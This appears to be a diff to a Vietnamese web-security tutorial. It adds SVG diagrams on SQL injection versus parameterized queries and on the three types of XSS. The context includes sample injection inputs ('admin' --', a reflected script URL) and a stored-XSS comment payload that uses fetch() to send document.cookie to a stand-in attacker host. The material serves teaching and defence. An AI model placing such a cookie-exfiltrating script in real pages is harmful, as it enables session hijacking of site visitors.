@@ -166,6 +166,62 @@ db.execute(
 )
 ```
 
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 360" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
+  <title>Nối chuỗi gây SQL Injection so với parameterized query</title>
+  <desc>Nhánh trên nối chuỗi: input người dùng hoà vào câu lệnh nên engine parse thành code độc. Nhánh dưới placeholder: data đi kênh riêng, luôn chỉ là giá trị. Minh hoạ nguyên tắc tách data khỏi code.</desc>
+  <text x="16" y="24" font-size="15" font-weight="700" fill="currentColor">Tách data khỏi code — gốc rễ chống SQL Injection</text>
+
+  <g>
+    <text x="16" y="52" font-size="12.5" font-weight="700" fill="#f59e0b">Nối chuỗi — input hoà vào câu lệnh</text>
+    <rect x="16" y="62" width="150" height="44" rx="9" fill="#f59e0b" fill-opacity="0.14" stroke="currentColor" stroke-opacity="0.2"/>
+    <text x="91" y="80" font-size="11.5" font-weight="700" text-anchor="middle" fill="currentColor">Input người dùng</text>
+    <text x="91" y="97" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.7">admin' --</text>
+    <rect x="266" y="62" width="186" height="44" rx="9" fill="currentColor" fill-opacity="0.06" stroke="currentColor" stroke-opacity="0.25"/>
+    <text x="359" y="80" font-size="11" font-weight="700" text-anchor="middle" fill="currentColor">Hoà thẳng vào SQL</text>
+    <text x="359" y="97" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.7">"...name = '" + input + "'"</text>
+    <rect x="552" y="62" width="152" height="44" rx="9" fill="#f59e0b" fill-opacity="0.2" stroke="currentColor" stroke-opacity="0.25"/>
+    <text x="628" y="80" font-size="11" font-weight="700" text-anchor="middle" fill="currentColor">Engine parse</text>
+    <text x="628" y="97" font-size="10.5" text-anchor="middle" fill="#f59e0b">input → CODE độc</text>
+    <g stroke="#f59e0b" stroke-width="2" fill="none">
+      <path d="M166 84 H260" marker-end="url(#ah)"/>
+      <path d="M452 84 H546" marker-end="url(#ah)"/>
+    </g>
+  </g>
+
+  <line x1="16" y1="138" x2="704" y2="138" stroke="currentColor" stroke-opacity="0.2"/>
+
+  <g>
+    <text x="16" y="170" font-size="12.5" font-weight="700" fill="#10b981">Placeholder — data đi kênh riêng</text>
+    <rect x="16" y="180" width="150" height="44" rx="9" fill="#10b981" fill-opacity="0.15" stroke="currentColor" stroke-opacity="0.2"/>
+    <text x="91" y="198" font-size="11.5" font-weight="700" text-anchor="middle" fill="currentColor">Input người dùng</text>
+    <text x="91" y="215" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.7">admin' --</text>
+    <rect x="266" y="180" width="186" height="44" rx="9" fill="currentColor" fill-opacity="0.06" stroke="currentColor" stroke-opacity="0.25"/>
+    <text x="359" y="198" font-size="11" font-weight="700" text-anchor="middle" fill="currentColor">Câu lệnh có %s</text>
+    <text x="359" y="215" font-size="10" text-anchor="middle" fill="currentColor" opacity="0.7">"...name = %s" + (input,)</text>
+    <rect x="552" y="180" width="152" height="44" rx="9" fill="#10b981" fill-opacity="0.2" stroke="currentColor" stroke-opacity="0.25"/>
+    <text x="628" y="198" font-size="11" font-weight="700" text-anchor="middle" fill="currentColor">Engine bind</text>
+    <text x="628" y="215" font-size="10.5" text-anchor="middle" fill="#10b981">input chỉ là GIÁ TRỊ</text>
+    <g stroke="#10b981" stroke-width="2" fill="none">
+      <path d="M166 202 H260" marker-end="url(#ah2)"/>
+      <path d="M452 202 H546" marker-end="url(#ah2)"/>
+    </g>
+  </g>
+
+  <g>
+    <text x="16" y="262" font-size="11.5" font-weight="700" fill="currentColor">Hai kênh tách biệt khi parameterize:</text>
+    <rect x="16" y="274" width="340" height="30" rx="8" fill="#10b981" fill-opacity="0.12" stroke="currentColor" stroke-opacity="0.2"/>
+    <text x="32" y="293" font-size="11" fill="currentColor">Kênh CODE — câu lệnh cố định, do dev viết</text>
+    <rect x="364" y="274" width="340" height="30" rx="8" fill="#3b82f6" fill-opacity="0.12" stroke="currentColor" stroke-opacity="0.2"/>
+    <text x="380" y="293" font-size="11" fill="currentColor">Kênh DATA — giá trị người dùng, không bao giờ thành code</text>
+    <text x="16" y="330" font-size="11" fill="currentColor" opacity="0.8">Input không thể "thoát" sang kênh code → dấu nháy, -- chỉ là ký tự thường.</text>
+  </g>
+
+  <defs>
+    <marker id="ah" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0 0 L9 4.5 L0 9 z" fill="#f59e0b"/></marker>
+    <marker id="ah2" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0 0 L9 4.5 L0 9 z" fill="#10b981"/></marker>
+  </defs>
+</svg>
+
 Quy tắc: **luôn parameterize**. Nếu phải truyền tên bảng/cột động (không parameterize được), hãy **whitelist** giá trị cho phép, không nối thẳng. ORM giúp nhiều nhưng `raw()` / string interpolation trong ORM vẫn vỡ như thường.
 
 > 💡 Nguyên tắc: Đừng "lọc ký tự xấu" (blacklist `'`, `;`...) để chống SQLi — luôn có cách bypass (encoding, ký tự Unicode tương đương). Parameterize là cách đúng và duy nhất đáng tin.
@@ -179,6 +235,70 @@ XSS là injection vào **trình duyệt**: kẻ tấn công nhét JavaScript ch�
 | **Reflected** | Quay lại ngay trong response (URL param) | Link độc `?q=<script>...</script>` gửi qua email |
 | **Stored** | Được lưu vào DB rồi render cho người khác | Comment chứa `<script>` hiển thị cho mọi viewer |
 | **DOM-based** | JS phía client tự ghi input vào DOM | `el.innerHTML = location.hash` |
+
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 360" role="img" style="width:100%;max-width:720px;height:auto;display:block;margin:1.25rem auto" font-family="ui-sans-serif, system-ui, sans-serif">
+  <title>Ba loại XSS theo đường đi của payload</title>
+  <desc>Ba luồng song song từ kẻ tấn công tới trình duyệt nạn nhân: Reflected qua URL param phản hồi ngay, Stored lưu vào DB rồi render cho nhiều viewer, DOM-based do JS client tự ghi vào DOM.</desc>
+  <text x="16" y="24" font-size="15" font-weight="700" fill="currentColor">Ba loại XSS — đường đi của payload</text>
+  <text x="16" y="50" font-size="11" fill="currentColor" opacity="0.7">Kẻ tấn công →</text>
+  <text x="704" y="50" font-size="11" text-anchor="end" fill="currentColor" opacity="0.7">→ Trình duyệt nạn nhân (script chạy)</text>
+
+  <g>
+    <rect x="16" y="62" width="688" height="86" rx="10" fill="#f59e0b" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.18"/>
+    <text x="28" y="84" font-size="12.5" font-weight="700" fill="#f59e0b">Reflected</text>
+    <text x="28" y="102" font-size="10.5" fill="currentColor" opacity="0.75">payload quay lại ngay trong response</text>
+    <rect x="150" y="96" width="124" height="34" rx="8" fill="currentColor" fill-opacity="0.06" stroke="currentColor" stroke-opacity="0.22"/>
+    <text x="212" y="117" font-size="10.5" text-anchor="middle" fill="currentColor">Link độc ?q=&lt;script&gt;</text>
+    <rect x="330" y="96" width="120" height="34" rx="8" fill="#f59e0b" fill-opacity="0.18" stroke="currentColor" stroke-opacity="0.22"/>
+    <text x="390" y="117" font-size="10.5" text-anchor="middle" fill="currentColor">Server phản hồi ngay</text>
+    <rect x="566" y="96" width="120" height="34" rx="8" fill="#f59e0b" fill-opacity="0.22" stroke="currentColor" stroke-opacity="0.22"/>
+    <text x="626" y="117" font-size="10.5" text-anchor="middle" fill="currentColor">Trình duyệt</text>
+    <g stroke="#f59e0b" stroke-width="2" fill="none">
+      <path d="M274 113 H326" marker-end="url(#x1)"/>
+      <path d="M450 113 H562" marker-end="url(#x1)"/>
+    </g>
+  </g>
+
+  <g>
+    <rect x="16" y="158" width="688" height="86" rx="10" fill="#3b82f6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.18"/>
+    <text x="28" y="180" font-size="12.5" font-weight="700" fill="#3b82f6">Stored</text>
+    <text x="28" y="198" font-size="10.5" fill="currentColor" opacity="0.75">lưu vào DB → render cho nhiều viewer</text>
+    <rect x="150" y="192" width="124" height="34" rx="8" fill="currentColor" fill-opacity="0.06" stroke="currentColor" stroke-opacity="0.22"/>
+    <text x="212" y="213" font-size="10.5" text-anchor="middle" fill="currentColor">Comment &lt;script&gt;</text>
+    <rect x="330" y="192" width="120" height="34" rx="8" fill="#3b82f6" fill-opacity="0.18" stroke="currentColor" stroke-opacity="0.22"/>
+    <text x="390" y="213" font-size="10.5" text-anchor="middle" fill="currentColor">Lưu vào DB</text>
+    <rect x="510" y="184" width="176" height="50" rx="8" fill="#3b82f6" fill-opacity="0.22" stroke="currentColor" stroke-opacity="0.22"/>
+    <text x="598" y="203" font-size="10.5" text-anchor="middle" fill="currentColor">Mọi viewer xem trang</text>
+    <text x="598" y="220" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.8">→ nhiều trình duyệt</text>
+    <g stroke="#3b82f6" stroke-width="2" fill="none">
+      <path d="M274 209 H326" marker-end="url(#x2)"/>
+      <path d="M450 209 H506" marker-end="url(#x2)"/>
+    </g>
+  </g>
+
+  <g>
+    <rect x="16" y="254" width="688" height="86" rx="10" fill="#8b5cf6" fill-opacity="0.13" stroke="currentColor" stroke-opacity="0.18"/>
+    <text x="28" y="276" font-size="12.5" font-weight="700" fill="#8b5cf6">DOM-based</text>
+    <text x="28" y="294" font-size="10.5" fill="currentColor" opacity="0.75">JS client tự ghi input vào DOM (không qua server)</text>
+    <rect x="150" y="288" width="124" height="34" rx="8" fill="currentColor" fill-opacity="0.06" stroke="currentColor" stroke-opacity="0.22"/>
+    <text x="212" y="309" font-size="10.5" text-anchor="middle" fill="currentColor">URL #hash độc</text>
+    <rect x="330" y="288" width="120" height="34" rx="8" fill="#8b5cf6" fill-opacity="0.18" stroke="currentColor" stroke-opacity="0.22"/>
+    <text x="390" y="309" font-size="10.5" text-anchor="middle" fill="currentColor">JS client đọc hash</text>
+    <rect x="566" y="288" width="120" height="34" rx="8" fill="#8b5cf6" fill-opacity="0.22" stroke="currentColor" stroke-opacity="0.22"/>
+    <text x="626" y="304" font-size="10.5" text-anchor="middle" fill="currentColor">innerHTML</text>
+    <text x="626" y="318" font-size="10.5" text-anchor="middle" fill="currentColor" opacity="0.8">ghi vào DOM</text>
+    <g stroke="#8b5cf6" stroke-width="2" fill="none">
+      <path d="M274 305 H326" marker-end="url(#x3)"/>
+      <path d="M450 305 H562" marker-end="url(#x3)"/>
+    </g>
+  </g>
+
+  <defs>
+    <marker id="x1" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0 0 L9 4.5 L0 9 z" fill="#f59e0b"/></marker>
+    <marker id="x2" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0 0 L9 4.5 L0 9 z" fill="#3b82f6"/></marker>
+    <marker id="x3" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0 0 L9 4.5 L0 9 z" fill="#8b5cf6"/></marker>
+  </defs>
+</svg>
 
 **Kẻ tấn công làm gì (stored):** Đăng một comment `<script>fetch('https://evil.tld/c?'+document.cookie)</script>`. Mỗi người xem trang comment đều bị gửi cookie sang server kẻ tấn công.
 
